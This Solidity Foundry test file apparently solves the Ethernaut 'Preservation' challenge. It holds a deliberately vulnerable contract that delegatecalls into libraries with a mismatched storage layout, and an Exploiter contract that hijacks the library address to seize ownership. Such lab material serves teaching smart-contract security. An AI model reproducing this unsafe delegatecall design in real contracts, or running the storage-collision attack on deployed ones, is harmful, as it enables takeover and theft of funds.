// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

contract PreservationTest is Test {
    address timeZone1;
    address timeZone2;
    Preservation instance;

    address attacker = makeAddr("attacker");

    function setUp() public {
        timeZone1 = address(new LibraryContract());
        timeZone2 = address(new LibraryContract());
        instance = new Preservation(timeZone1, timeZone2);
    }

    function test() public {
        vm.prank(attacker);
        Exploiter exploiter = new Exploiter();
        exploiter.exploit(address(instance));

        console2.log("Owner: ", instance.owner());
        assertEq(instance.owner(), attacker);
    }
}

contract Exploiter {
    address public slot0;
    address public slot1;
    address public slot3;
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function exploit(address _instance) external {
        _instance.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(address(this)))));
        _instance.call(abi.encodeWithSignature("setFirstTime(uint256)", 0));
    }

    function setTime(uint256 /* _time */) public {
        slot3 = owner;
    }
}

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}